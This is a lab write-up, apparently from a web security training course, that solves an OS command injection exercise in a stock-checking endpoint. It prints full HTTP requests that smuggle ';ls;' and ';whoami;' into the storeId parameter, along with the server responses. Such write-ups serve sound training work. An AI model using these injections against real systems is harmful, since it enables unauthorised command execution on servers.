## OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.

## Notes

- /product/stock
- /resources/js/stockCheck.js

## Resume

1. Capture a `/product/stock` request
2. Inject OS command payload
3. Execute `whoami`


## Solve 

First step is to capture a `/product/stock` request : 

```
POST /product/stock HTTP/2
Host: 0a2100880326f46b84174b7e00650049.web-security-academy.net
Cookie: session=ZrItQyYpGluM5zs1k5bqi2UD1HTU5n23
Content-Length: 21
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a2100880326f46b84174b7e00650049.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2100880326f46b84174b7e00650049.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


productId=1&storeId=1
```

Then try to RCE on one of the two parameters : 

```
POST /product/stock HTTP/2
Host: 0a2100880326f46b84174b7e00650049.web-security-academy.net
Cookie: session=ZrItQyYpGluM5zs1k5bqi2UD1HTU5n23
Content-Length: 21
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a2100880326f46b84174b7e00650049.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2100880326f46b84174b7e00650049.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


productId=1&storeId=1;ls;
```

The answer : 

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 18

62
stockreport.sh
```

Replace the `;ls;` with `;whoami;` : 

```
POST /product/stock HTTP/2
Host: 0a2100880326f46b84174b7e00650049.web-security-academy.net
Cookie: session=ZrItQyYpGluM5zs1k5bqi2UD1HTU5n23
Content-Length: 21
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: */*
Origin: https://0a2100880326f46b84174b7e00650049.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a2100880326f46b84174b7e00650049.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


productId=1&storeId=1;whoami;
```

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 18

62
peter-g5LDOG
```
